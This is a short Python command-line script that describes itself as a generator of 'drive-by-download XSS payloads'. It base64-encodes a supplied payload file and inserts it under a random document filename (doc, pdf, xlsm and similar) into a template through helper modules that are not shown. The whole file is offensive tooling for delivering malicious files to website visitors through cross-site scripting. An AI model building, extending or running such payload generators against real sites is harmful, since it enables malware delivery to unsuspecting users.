import click
import sys
import string
import random

from core.encoder import b64
from core.convert import sub

CHOICES = (
    'doc',
    'pdf',
    'xls',
    'docx',
    'xlsx',
    'xlsm',
)


@click.command()
@click.option('--file-type', type=click.Choice(CHOICES, case_sensitive=True))
@click.option('--payload', type=click.Path(exists=True, dir_okay=False))
def generate(file_type, payload):
    """Generate a drive-by-download XSS payload."""
    supplied_args = sys.argv[1:]
    if not supplied_args:
        context = click.get_current_context()
        click.echo(context.get_help())
        context.exit(2)

    filename = ''.join(
        random.choice(
            string.ascii_lowercase +
            string.digits) for _ in range(7))
    embedded = b64(payload)

    click.echo(sub(filename + '.' + file_type, embedded))


if __name__ == '__main__':
    generate()
